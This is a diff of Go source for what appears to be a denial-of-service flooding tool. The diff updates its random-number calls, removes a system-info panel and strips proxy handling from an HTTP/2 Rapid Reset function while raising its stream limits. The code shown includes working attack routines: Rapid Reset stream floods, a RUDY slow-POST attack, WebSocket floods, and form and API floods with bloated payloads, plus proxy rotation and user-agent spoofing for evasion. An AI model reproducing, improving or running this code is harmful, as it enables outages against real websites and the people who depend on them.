@@ -10,7 +10,7 @@ import (
     "fmt"
     "io"
     "log"
-    "math/rand"
+    "math/rand/v2"
     "net"
     "net/http"
     "net/url"
@@ -28,19 +28,6 @@ import (
     "golang.org/x/net/http2/hpack"
 )
 
-var defaultUserAgents = []string{
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
-    "Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
-}
-
 var userAgents []string
 var totalSent atomic.Int64
 var totalSuccess atomic.Int64
@@ -50,17 +37,33 @@ var zstdBombPayload []byte
 var startTime time.Time
 var statusCounts = make(map[string]int)
 var statusMutex = sync.Mutex{}
-var logBuf bytes.Buffer
+var logLines []string
 var logMutex = sync.Mutex{}
 var maxLogLines = 10
-var logLines []string
 var cBlink = "\033[5m"
+
+var bufPool = sync.Pool{
+    New: func() interface{} {
+        return make([]byte, 16384)
+    },
+}
 
 func init() {
     if uas, err := loadUserAgents("useragent.txt"); err == nil && len(uas) > 0 {
         userAgents = uas
     } else {
-        userAgents = defaultUserAgents
+        userAgents = []string{
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
+            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
+            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
+            "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
+            "Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
+        }
     }
 
     var buf bytes.Buffer
@@ -97,7 +100,7 @@ func loadUserAgents(filename string) ([]string, error) {
 }
 
 func randUA() string {
-    return userAgents[rand.Intn(len(userAgents))]
+    return userAgents[rand.IntN(len(userAgents))]
 }
 
 func loadProxies(filename string) ([]string, error) {
@@ -140,46 +143,7 @@ func logEvent(msg string) {
     }
 }
 
-func getSysInfo() map[string]string {
-    info := make(map[string]string)
-    info["OS"] = runtime.GOOS + " " + runtime.GOARCH
-    info["CPU"] = fmt.Sprintf("%d cores", runtime.NumCPU())
-
-    if runtime.GOOS == "linux" {
-        if b, err := os.ReadFile("/etc/os-release"); err == nil {
-            for _, line := range strings.Split(string(b), "\n") {
-                if strings.HasPrefix(line, "PRETTY_NAME=") {
-                    info["OS"] = strings.Trim(strings.Split(line, "=")[1], `"`)
-                    break
-                }
-            }
-        }
-        if b, err := os.ReadFile("/proc/sys/kernel/osrelease"); err == nil {
-            info["Kernel"] = strings.TrimSpace(string(b))
-        }
-        if b, err := os.ReadFile("/proc/meminfo"); err == nil {
-            lines := strings.Split(string(b), "\n")
-            if len(lines) > 0 {
-                info["Memory"] = strings.TrimSpace(lines[0])
-            }
-        }
-        if out, err := exec.Command("uname", "-n").Output(); err == nil {
-            info["Host"] = strings.TrimSpace(string(out))
-        } else {
-            info["Host"] = "Local-Machine"
-        }
-    } else {
-        info["Host"] = "Local-Machine"
-        info["Kernel"] = "N/A"
-        info["Memory"] = "N/A"
-    }
-
-    info["Uptime"] = time.Since(startTime).Round(time.Second).String()
-    return info
-}
-
 func drawUI(target, method, proxyFile string, workers, duration int) {
-    sysInfo := getSysInfo()
     sent := totalSent.Load()
     success := totalSuccess.Load()
     errors := totalErrors.Load()
@@ -202,23 +166,27 @@ func drawUI(target, method, proxyFile string, workers, duration int) {
     cDim := "\033[2m"
 
     logo := []string{
-        cRed + "      _,met$$$$$gg.          " + cReset,
-        cRed + "    ,g$$$$$$$$$$$$$$$P.       " + cReset,
-        cRed + "  ,g$$P\"     \"\"\"Y$$.\".        " + cReset,
-        cRed + " ,$$P'              `$$$.     " + cReset,
-        cRed + "',$$P       ,ggs.     `$$b:   " + cReset,
-        cRed + "`d$$'     ,$P\"'   .    $$$    " + cReset,
-        cRed + " $$P      d$'     ,    $$P    " + cReset,
-        cRed + " $$:      $$.   -    ,d$$'    " + cReset,
-        cRed + " $$;      Y$b._   _,d$P'      " + cReset,
-        cRed + " Y$$.    `.`\"Y$$$$P\"'         " + cReset,
-        cRed + " `$$b      \"-.__              " + cReset,
-        cRed + "  `Y$$                        " + cReset,
-        cRed + "   `Y$$.                      " + cReset,
-        cRed + "     `$$b.                    " + cReset,
-        cRed + "       `Y$$b.                 " + cReset,
-        cRed + "          `\"Y$b._             " + cReset,
-        cRed + "              `\"\"\"            " + cReset,
+        cRed + "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⡖⠿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" + cReset,
+        cRed + "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣞⡻⠉⢀⠀⠈⠳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" + cReset,
+        cRed + "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡏⠀⡂⣸⣦⠀⠀⠘⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" + cReset,
+        cRed + "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⢻⠉⠻⠐⣭⡀⠀⠙⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" + cReset,
+        cRed + "⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⢡⠤⠜⠂⠀⠀⠈⠘⠀⠀⠀⠱⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" + cReset,
+        cRed + "⠀⠀⠀⠀⠀⠀⣠⠞⠁⠙⢦⣀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠣⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" + cReset,
+        cRed + "⠀⠀⠀⠀⠀⠀⢸⡀⠀⠀⠀⠉⠳⣄⠀⠀⠹⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⣼⣶⣶⢒⣒⡒⢤⡤⠀⠀⢦⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" + cReset,
+        cRed + "⠀⢰⣶⣿⣿⣿⣾⣧⣤⣬⣤⣀⣙⣿⣤⣤⡆⠂⠂⡀⠀⠀⠀⠀⣀⠀⠠⠐⠂⠈⡋⣟⣿⣇⣠⡀⡼⣇⣀⡀⠰⣷⣶⣶⣶⠒⠒⠒⠒⠒⠒⠒⠒⠢⠤⢄⡀" + cReset,
+        cRed + "⠀⠀⠀⠀⠉⠉⢛⣿⢿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠄⠀⠀⠀⠀⠂⠂⠀⠉⣟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣿⣷⣶⣶⣶⣶⣶⣶⣾⣿⠿⠛⠁" + cReset,
+        cRed + "⠀⠀⠀⠀⠀⠀⠈⠛⢻⣿⣿⣿⣿⡏⢁⣀⣀⣠⣤⣤⡤⠀⢀⠀⠀⢀⡀⣀⣠⣤⣿⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⢿⠟⠛⠋⠉⠉⠀⠀⠀⠀" + cReset,
+        cRed + "⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⡿⠿⠛⠛⠉⠀⠀⠒⢾⠤⠤⠤⠀⠚⠛⠉⢩⠙⠛⠛⠟⠿⣿⡿⢿⡿⣿⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" + cReset,
+        cRed + "⠀⠀⠀⠀⠀⠀⠀⠀⣀⣿⣿⠟⢻⠁⠀⠀⢀⣀⣀⣀⣀⠤⠀⠀⠀⠀⠀⢀⣤⡤⠼⣴⣤⣤⣤⣤⣿⡿⠿⠛⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" + cReset,
+        cRed + "⠠⢶⣶⣶⣿⣦⣤⣠⣿⣿⣶⣾⣿⣶⣿⣿⠿⠿⠛⠁⠀⠀⠀⠀⠤⠤⠶⠿⢿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" + cReset,
+        cRed + "⠀⠀⠀⠉⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠿⠿⠿⠿⠙⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" + cReset,
+        cRed + "⠀⠀⠀⠀⠀⠀⣿⠟⢿⣿⣿⣿⣿⡿⢻⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" + cReset,
+        cRed + "⠀⠀⠀⠀⠀⣸⡇⠀⣿⣿⣿⣿⠟⠀⢸⠋⠀⠀⠀⠀⠠⣤⣀⣄⣴⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" + cReset,
+        cRed + "⠀⠀⠀⠀⢀⡟⠀⢠⣿⣿⡟⠁⠀⠀⡸⠁⠀⠠⠀⠀⠁⠀⢉⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" + cReset,
+        cRed + "⠀⠀⠀⠀⣾⠀⠀⣼⡟⠁⠀⠀⠀⢠⡇⢀⢄⡞⠀⠀⡳⣴⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" + cReset,
+        cRed + "⠀⠀⠀⠀⠈⠙⠚⠋⠀⠀⠀⠀⢀⣾⠇⠡⠈⠀⠀⢀⣾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" + cReset,
+        cRed + "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠿⡆⠀⠀⢀⣴⠏⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" + cReset,
+        cRed + "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣷⣶⣾⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" + cReset,
     }
 
     proxyLabel := "DIRECT"
@@ -227,15 +195,6 @@ func drawUI(target, method, proxyFile string, workers, duration int) {
     }
 
     infoLines := []string{
-        cBold + cGreen + sysInfo["Host"] + cReset,
-        cDim + "-----------------------------------" + cReset,
-        cBold + "OS: " + cReset + sysInfo["OS"],
-        cBold + "Host: " + cReset + sysInfo["Host"],
-        cBold + "Kernel: " + cReset + sysInfo["Kernel"],
-        cBold + "Uptime: " + cReset + sysInfo["Uptime"],
-        cBold + "CPU: " + cReset + sysInfo["CPU"],
-        cBold + "Memory: " + cReset + sysInfo["Memory"],
-        cDim + "-----------------------------------" + cReset,
         cBold + cRed + "TARGET: " + cReset + cWhite + target + cReset,
         cBold + cMagenta + "METHOD: " + cReset + cWhite + strings.ToUpper(method) + cReset,
         cBold + cYellow + "WORKERS: " + cReset + cWhite + strconv.Itoa(workers) + cReset,
@@ -308,8 +267,8 @@ const (
     keepAliveInterval     = 30 * time.Second
     idleConnTimeout       = 90 * time.Second
     maxIdleConns          = 500
-    maxIdleConnsPerHost   = 250
-    maxConnsPerHost       = 250
+    maxIdleConnsPerHost   = 500
+    maxConnsPerHost       = 0
     maxClientsPerProxy    = 64
     maxDirectPool         = 256
 )
@@ -404,14 +363,14 @@ const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 func randString(n int) string {
     b := make([]byte, n)
     for i := range b {
-        b[i] = charset[rand.Intn(len(charset))]
+        b[i] = charset[rand.IntN(len(charset))]
     }
     return string(b)
 }
 
 func randEmail() string {
     domains := []string{"gmail.com", "yahoo.com", "outlook.com", "proton.me", "mail.ru", "example.com"}
-    return randString(8+rand.Intn(12)) + "@" + domains[rand.Intn(len(domains))]
+    return randString(8+rand.IntN(12)) + "@" + domains[rand.IntN(len(domains))]
 }
 
 func dialViaProxy(network, addr string, proxyURL *url.URL) (net.Conn, error) {
@@ -559,54 +518,54 @@ func httpGet(url string, client *http.Client) error {
 func genFormPayload() (string, string) {
     payloads := []func() string{
         func() string {
-            return "username=" + randString(8+rand.Intn(16)) +
-                "&password=" + randString(12+rand.Intn(20)) +
+            return "username=" + randString(8+rand.IntN(16)) +
+                "&password=" + randString(12+rand.IntN(20)) +
                 "&email=" + randEmail() +
                 "&csrf_token=" + randString(32)
         },
         func() string {
-            return "search=" + randString(20+rand.Intn(200)) +
+            return "search=" + randString(20+rand.IntN(200)) +
                 "&category=" + randString(5) +
-                "&page=" + strconv.Itoa(rand.Intn(500)) +
+                "&page=" + strconv.Itoa(rand.IntN(500)) +
                 "&submit=Search"
         },
         func() string {
             return "name=" + randString(10) +
                 "&email=" + randEmail() +
-                "&subject=" + randString(20+rand.Intn(40)) +
-                "&message=" + randString(200+rand.Intn(2000)) +
+                "&subject=" + randString(20+rand.IntN(40)) +
+                "&message=" + randString(200+rand.IntN(2000)) +
                 "&token=" + randString(64)
         },
         func() string {
             var sb strings.Builder
-            n := 50 + rand.Intn(200)
+            n := 50 + rand.IntN(200)
             for i := 0; i < n; i++ {
                 if i > 0 {
                     sb.WriteByte('&')
                 }
-                sb.WriteString(randString(3 + rand.Intn(8)))
+                sb.WriteString(randString(3 + rand.IntN(8)))
                 sb.WriteByte('=')
-                sb.WriteString(randString(5 + rand.Intn(30)))
+                sb.WriteString(randString(5 + rand.IntN(30)))
             }
             return sb.String()
         },
         func() string {
-            size := 10240 + rand.Intn(40960)
+            size := 10240 + rand.IntN(40960)
             blob := make([]byte, size)
             rand.Read(blob)
             return "data=" + base64.StdEncoding.EncodeToString(blob)
         },
     }
 
-    if rand.Intn(4) == 0 {
+    if rand.IntN(4) == 0 {
         jsonStr := fmt.Sprintf(
             `{"email":"%s","password":"%s","action":"login","token":"%s","data":"%s"}`,
-            randEmail(), randString(16+rand.Intn(32)), randString(64), randString(200+rand.Intn(1000)),
+            randEmail(), randString(16+rand.IntN(32)), randString(64), randString(200+rand.IntN(1000)),
         )
         return jsonStr, "application/json"
     }
 
-    return payloads[rand.Intn(len(payloads))](), "application/x-www-form-urlencoded"
+    return payloads[rand.IntN(len(payloads))](), "application/x-www-form-urlencoded"
 }
 
 func httpPost(targetURL string, client *http.Client) error {
@@ -658,12 +617,12 @@ func (r *slowReader) Read(p []byte) (int, error) {
 }
 
 func httpRudy(targetURL string, client *http.Client, stop <-chan struct{}) error {
-    declaredSize := 1024*1024 + rand.Intn(50*1024*1024)
+    declaredSize := 1024*1024 + rand.IntN(50*1024*1024)
     chunk := []byte("comment=" + randString(50) + "&" + randString(10) + "=" + randString(20) + "&")
 
     slow := &slowReader{
         data:  chunk,
-        delay: time.Duration(500+rand.Intn(2000)) * time.Millisecond,
+        delay: time.Duration(500+rand.IntN(2000)) * time.Millisecond,
         stop:  stop,
     }
 
@@ -701,7 +660,7 @@ func httpRudy(targetURL string, client *http.Client, stop <-chan struct{}) error
     return nil
 }
 
-func httpRapidReset(targetURL string, stop <-chan struct{}) error {
+func httpRapidResetAdvanced(targetURL string, stop <-chan struct{}) error {
     u, err := url.Parse(targetURL)
     if err != nil {
         recordStatus("Err")
@@ -720,60 +679,11 @@ func httpRapidReset(targetURL string, stop <-chan struct{}) error {
     }
     addr := net.JoinHostPort(host, port)
 
-    var rawConn net.Conn
-    if len(proxyList) > 0 {
-        proxy := proxyList[rand.Intn(len(proxyList))]
-        pURL, err := url.Parse(proxy)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        rawConn, err = net.DialTimeout("tcp", pURL.Host, 5*time.Second)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-
-        connectReq := "CONNECT " + addr + " HTTP/1.1\r\nHost: " + addr + "\r\n"
-        if pURL.User != nil {
-            user := pURL.User.Username()
-            pass, _ := pURL.User.Password()
-            cred := base64.StdEncoding.EncodeToString([]byte(user + ":" + pass))
-            connectReq += "Proxy-Authorization: Basic " + cred + "\r\n"
-        }
-        connectReq += "\r\n"
-
-        if _, err := rawConn.Write([]byte(connectReq)); err != nil {
-            rawConn.Close()
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-
-        br := bufio.NewReader(rawConn)
-        resp, err := http.ReadResponse(br, nil)
-        if err != nil {
-            rawConn.Close()
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        resp.Body.Close()
-        if resp.StatusCode != 200 {
-            rawConn.Close()
-            recordStatus("ProxyErr")
-            totalErrors.Add(1)
-            return err
-        }
-    } else {
-        rawConn, err = net.DialTimeout("tcp", addr, 5*time.Second)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
+    rawConn, err := net.DialTimeout("tcp", addr, 5*time.Second)
+    if err != nil {
+        recordStatus("Err")
+        totalErrors.Add(1)
+        return err
     }
 
     tlsConn := tls.Client(rawConn, &tls.Config{
@@ -801,98 +711,63 @@ func httpRapidReset(targetURL string, stop <-chan struct{}) error {
         return err
     }
 
-    bw := bufio.NewWriterSize(tlsConn, 65536)
+    bw := bufio.NewWriterSize(tlsConn, 1<<20)
     framer := http2.NewFramer(bw, tlsConn)
     framer.AllowIllegalWrites = true
 
     framer.WriteSettings(
-        http2.Setting{ID: http2.SettingMaxConcurrentStreams, Val: 1000},
-        http2.Setting{ID: http2.SettingInitialWindowSize, Val: 65535},
+        http2.Setting{ID: http2.SettingMaxConcurrentStreams, Val: 1<<31 - 1},
+        http2.Setting{ID: http2.SettingInitialWindowSize, Val: 1<<31 - 1},
     )
     bw.Flush()
 
-    connDone := make(chan struct{})
-    go func() {
-        defer close(connDone)
-        for {
-            f, err := framer.ReadFrame()
-            if err != nil {
-                return
-            }
-            switch sf := f.(type) {
-            case *http2.SettingsFrame:
-                if !sf.IsAck() {
-                    framer.WriteSettingsAck()
-                    bw.Flush()
-                }
-            case *http2.GoAwayFrame:
-                return
-            }
-        }
-    }()
-
+    var streamID uint32 = 1
     var hdrBuf bytes.Buffer
     enc := hpack.NewEncoder(&hdrBuf)
-
     path := u.RequestURI()
     if path == "" {
         path = "/"
     }
-    scheme := u.Scheme
-    if scheme == "" || scheme == "http" {
-        scheme = "https"
-    }
-    authority := u.Host
-
-    var streamID uint32 = 1
-    const batchSize = 100
 
     for {
         select {
         case <-stop:
             return nil
-        case <-connDone:
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return fmt.Errorf("connection closed by server")
         default:
         }
 
-        for i := 0; i < batchSize; i++ {
-            hdrBuf.Reset()
-            enc.WriteField(hpack.HeaderField{Name: ":method", Value: "GET"})
-            enc.WriteField(hpack.HeaderField{Name: ":path", Value: path})
-            enc.WriteField(hpack.HeaderField{Name: ":scheme", Value: scheme})
-            enc.WriteField(hpack.HeaderField{Name: ":authority", Value: authority})
-            enc.WriteField(hpack.HeaderField{Name: "user-agent", Value: randUA()})
+        hdrBuf.Reset()
+        enc.WriteField(hpack.HeaderField{Name: ":method", Value: "GET"})
+        enc.WriteField(hpack.HeaderField{Name: ":path", Value: path})
+        enc.WriteField(hpack.HeaderField{Name: ":scheme", Value: "https"})
+        enc.WriteField(hpack.HeaderField{Name: ":authority", Value: u.Host})
+        enc.WriteField(hpack.HeaderField{Name: "user-agent", Value: randUA()})
 
-            if err := framer.WriteHeaders(http2.HeadersFrameParam{
-                StreamID:      streamID,
-                BlockFragment: hdrBuf.Bytes(),
-                EndStream:     true,
-                EndHeaders:    true,
-            }); err != nil {
-                recordStatus("Err")
-                totalErrors.Add(1)
-                return err
-            }
-
-            if err := framer.WriteRSTStream(streamID, http2.ErrCodeCancel); err != nil {
-                recordStatus("Err")
-                totalErrors.Add(1)
-                return err
-            }
-
-            recordStatus("RST")
-            totalSuccess.Add(1)
-            streamID += 2
-
-            if streamID >= 1<<31-1 {
-                bw.Flush()
-                return nil
-            }
+        if err := framer.WriteHeaders(http2.HeadersFrameParam{
+            StreamID:      streamID,
+            BlockFragment: hdrBuf.Bytes(),
+            EndStream:     true,
+            EndHeaders:    true,
+        }); err != nil {
+            return err
         }
-        bw.Flush()
+
+        if err := framer.WriteRSTStream(streamID, http2.ErrCodeCancel); err != nil {
+            return err
+        }
+
+        streamID += 2
+        if streamID >= 1<<31-1 {
+            bw.Flush()
+            return nil
+        }
+
+        if streamID%100 == 0 {
+            bw.Flush()
+        }
+
+        recordStatus("RST")
+        totalSuccess.Add(1)
     }
 }
 
@@ -908,7 +783,7 @@ func wsFlood(targetURL string, stop <-chan struct{}) error {
 
     var proxyURL *url.URL
     if len(proxyList) > 0 {
-        proxy := proxyList[rand.Intn(len(proxyList))]
+        proxy := proxyList[rand.IntN(len(proxyList))]
         var err error
         proxyURL, err = url.Parse(proxy)
         if err != nil {
@@ -960,19 +835,19 @@ func wsFlood(targetURL string, stop <-chan struct{}) error {
         }
 
         var err error
-        switch rand.Intn(5) {
+        switch rand.IntN(5) {
         case 0:
             msg := fmt.Sprintf(`{"action":"%s","data":"%s","ts":%d}`,
-                randString(8), randString(200+rand.Intn(2000)), time.Now().UnixNano())
+                randString(8), randString(200+rand.IntN(2000)), time.Now().UnixNano())
             err = conn.WriteMessage(websocket.TextMessage, []byte(msg))
         case 1:
-            data := make([]byte, 1024+rand.Intn(7168))
+            data := make([]byte, 1024+rand.IntN(7168))
             rand.Read(data)
             err = conn.WriteMessage(websocket.BinaryMessage, data)
         case 2:
             err = conn.WriteMessage(websocket.PingMessage, []byte(randString(16)))
         case 3:
-            err = conn.WriteMessage(websocket.TextMessage, []byte(randString(10240+rand.Intn(40960))))
+            err = conn.WriteMessage(websocket.TextMessage, []byte(randString(10240+rand.IntN(40960))))
         case 4:
             for j := 0; j < 10; j++ {
                 if e := conn.WriteMessage(websocket.TextMessage, []byte(randString(16))); e != nil {
@@ -1000,16 +875,16 @@ var apiEndpoints = []string{"/api/v1/users", "/api/v2/data", "/api/graphql", "/a
 func genAPIPayload() string {
     generators := []func() string{
         func() string {
-            bioLen := 2000 + rand.Intn(8000)
+            bioLen := 2000 + rand.IntN(8000)
             return fmt.Sprintf(
                 `{"user_id":"%d","action":"%s","bio":"%s","nonce":"%s","email":"%s","display_name":"%s"}`,
-                rand.Intn(9999999), apiActions[rand.Intn(len(apiActions))],
-                randString(bioLen), randString(32), randEmail(), randString(12+rand.Intn(20)),
+                rand.IntN(9999999), apiActions[rand.IntN(len(apiActions))],
+                randString(bioLen), randString(32), randEmail(), randString(12+rand.IntN(20)),
             )
         },
         func() string {
             var sb strings.Builder
-            n := 500 + rand.Intn(4500)
+            n := 500 + rand.IntN(4500)
             sb.WriteString(`{"action":"bulk_insert","token":"`)
             sb.WriteString(randString(64))
             sb.WriteString(`","items":[`)
@@ -1018,16 +893,16 @@ func genAPIPayload() string {
                     sb.WriteByte(',')
                 }
                 fmt.Fprintf(&sb, `{"id":%d,"name":"%s","value":"%s"}`,
-                    rand.Intn(9999999), randString(8+rand.Intn(16)), randString(20+rand.Intn(100)))
+                    rand.IntN(9999999), randString(8+rand.IntN(16)), randString(20+rand.IntN(100)))
             }
             sb.WriteString(`]}`)
             return sb.String()
         },
         func() string {
-            depth := 20 + rand.Intn(30)
+            depth := 20 + rand.IntN(30)
             var sb strings.Builder
             for i := 0; i < depth; i++ {
-                fmt.Fprintf(&sb, `{"level_%d":{"data":"%s","nested":`, i, randString(50+rand.Intn(200)))
+                fmt.Fprintf(&sb, `{"level_%d":{"data":"%s","nested":`, i, randString(50+rand.IntN(200)))
             }
             sb.WriteString(`{"end":true}`)
             for i := 0; i < depth; i++ {
@@ -1038,38 +913,38 @@ func genAPIPayload() string {
         func() string {
             return fmt.Sprintf(
                 `{"query":"mutation { updateUser(input: $input) { id status } }","variables":{"input":{"id":"%d","name":"%s","bio":"%s","settings":{"theme":"%s","lang":"%s","notifications":%t,"data":"%s"}}}}`,
-                rand.Intn(9999999), randString(16), randString(3000+rand.Intn(5000)),
-                randString(8), randString(5), rand.Intn(2) == 1, randString(1000+rand.Intn(4000)),
+                rand.IntN(9999999), randString(16), randString(3000+rand.IntN(5000)),
+                randString(8), randString(5), rand.IntN(2) == 1, randString(1000+rand.IntN(4000)),
             )
         },
         func() string {
             return fmt.Sprintf(
                 `{"email":"%s","password":"%s","mfa_code":"%06d","device_id":"%s","fingerprint":"%s"}`,
-                randEmail(), randString(16+rand.Intn(32)), rand.Intn(999999),
+                randEmail(), randString(16+rand.IntN(32)), rand.IntN(999999),
                 randString(36), randString(64),
             )
         },
         func() string {
             var sb strings.Builder
             sb.WriteString(`{"action":"search","filters":{`)
-            n := 20 + rand.Intn(50)
+            n := 20 + rand.IntN(50)
             for i := 0; i < n; i++ {
                 if i > 0 {
                     sb.WriteByte(',')
                 }
-                fmt.Fprintf(&sb, `"%s":"%s"`, randString(5+rand.Intn(10)), randString(10+rand.Intn(100)))
+                fmt.Fprintf(&sb, `"%s":"%s"`, randString(5+rand.IntN(10)), randString(10+rand.IntN(100)))
             }
             sb.WriteString(fmt.Sprintf(`},"page":%d,"limit":%d,"sort":"%s"}`,
-                rand.Intn(10000), 100+rand.Intn(900), randString(8)))
+                rand.IntN(10000), 100+rand.IntN(900), randString(8)))
             return sb.String()
         },
     }
-    return generators[rand.Intn(len(generators))]()
+    return generators[rand.IntN(len(generators))]()
 }
 
 func httpAPIFlood(targetURL string, client *http.Client) error {
